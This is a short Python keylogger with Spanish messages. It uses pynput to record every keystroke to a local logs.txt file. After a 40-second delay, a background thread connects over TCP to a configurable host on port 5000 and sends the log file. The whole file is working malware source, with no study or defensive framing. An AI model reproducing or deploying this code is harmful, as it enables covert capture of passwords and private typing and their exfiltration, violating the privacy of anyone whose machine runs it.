from pynput.keyboard import Listener
import socket
import threading
import time

log_file = "logs.txt"
HOST = '' 
PORT = 5000

def on_press(key):
    try:
        with open(log_file, "a") as file:
            file.writelines(f"{key.char}\n")
    except AttributeError:
        with open(log_file, "a") as file:
            file.writelines(f" {key} \n")


def enviar_archivo():
    time.sleep(40)  
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((HOST, PORT))
            with open(log_file, "rb") as f:
                data = f.read(1024)
                while data:
                    s.sendall(data)
                    data = f.read(1024)
        print("Archivo enviado.")
    except Exception as e:
        print("Error al enviar:", e)

hilo_envio = threading.Thread(target=enviar_archivo)
hilo_envio.start()

with Listener(on_press=on_press) as listener:
    listener.join()
